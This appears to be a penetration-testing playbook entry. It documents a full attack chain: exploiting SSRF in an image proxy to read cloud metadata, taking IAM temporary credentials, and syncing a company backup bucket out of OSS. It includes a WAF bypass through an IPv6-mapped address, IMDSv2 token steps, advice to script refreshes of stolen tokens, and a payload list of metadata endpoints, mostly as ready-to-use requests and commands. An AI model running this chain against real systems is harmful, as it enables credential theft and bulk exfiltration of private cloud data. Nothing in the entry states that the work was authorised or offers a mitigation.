# [2026-02] SSRF → Cloud Metadata → AK/SK → Full OSS Data Exfiltration

## Scenario Classification
Web Penetration Testing / Cloud Security

## Goal Overview
Exploit an SSRF vulnerability in a web application to access the cloud metadata service, obtain temporary credentials, and ultimately export all data from an OSS bucket.

## Complete Execution Chain

1. Discover SSRF in an image proxy endpoint.
   ```
   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK (internal port scan succeeded)
   ```
2. Attempt to access cloud metadata.
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   → returns the metadata directory listing
   ```
3. Obtain the IAM role name.
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → ECS-Role-WebApp
   ```
4. Obtain temporary credentials.
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
   → AccessKeyId, SecretAccessKey, Token
   ```
5. Use the credentials to enumerate OSS buckets.
   ```bash
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws s3 ls  # or aliyun oss ls
   ```
6. Discover a sensitive bucket and export its data.
   ```bash
   aws s3 sync s3://company-backup ./backup/
   ```

## Pitfalls

| Issue | Cause | Solution | Time Spent |
|------|------|---------|------|
| SSRF blocked by WAF for 169.254 | IP blacklist | Bypass using the IPv6 address `[::ffff:169.254.169.254]` | 15min |
| Temporary credentials expire after 1 hour | Short STS token lifetime | Write a script to automatically refresh the token | 10min |
| Metadata v2 requires a token | IMDSv2 protection | First send a PUT to obtain a token, then include the token in requests | 20min |

## Toolchain Findings
- Alibaba Cloud and AWS use different metadata paths; try each separately.
- IMDSv2 requires a two-step request (PUT to obtain a token → GET with the token).
- Some cloud providers now enable IMDSv2 by default, making SSRF more difficult.

## Key Code/Commands

```bash
# IMDSv2 bypass (requires SSRF support for custom methods and headers)
# Step 1: Obtain token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Request with token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

## Reusable Patterns/Script Snippets

```bash
# Quick SSRF cloud metadata detection payload list
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)
```

## Suggestions for This Package
- routing.md already has the SSRF/cloud security route ✓
- Suggest adding a comparison table of metadata paths for various cloud providers to pentest-tools/references

## Evolution Actions
- [ ] Add cloud metadata path comparison table to references

## Environment Information
- Target: Alibaba Cloud ECS + OSS
- Web framework: Spring Boot 2.7
- SSRF type: Full-response SSRF (Full SSRF)
